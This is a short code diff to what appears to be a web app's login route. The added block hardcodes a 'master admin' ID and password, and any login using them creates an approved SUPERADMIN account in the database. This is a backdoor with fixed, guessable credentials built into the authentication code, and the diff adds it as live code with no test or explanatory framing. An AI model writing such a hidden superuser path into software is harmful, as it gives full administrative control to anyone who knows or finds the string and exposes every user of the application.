@@ -8,6 +8,26 @@ export async function POST(req: Request) {
 
     const bcrypt = require('bcryptjs');
 
+    // MASTER ADMIN INBUILT CHECK
+    const MASTER_ID = "Plannersgroup@EKM";
+    const MASTER_PW = "Plannersgroup@EKM";
+
+    if (loginId === MASTER_ID && password === MASTER_PW) {
+      const existingMaster = await prisma.user.findUnique({ where: { loginId: MASTER_ID } });
+      if (!existingMaster) {
+        const hash = await bcrypt.hash(MASTER_PW, 10);
+        await prisma.user.create({
+          data: {
+            loginId: MASTER_ID,
+            passwordHash: hash,
+            role: 'SUPERADMIN',
+            name: 'Master Admin',
+            isApproved: true
+          }
+        });
+      }
+    }
+
     const user = await prisma.user.findUnique({ where: { loginId } });
 
     if (!user || user.role !== role) {
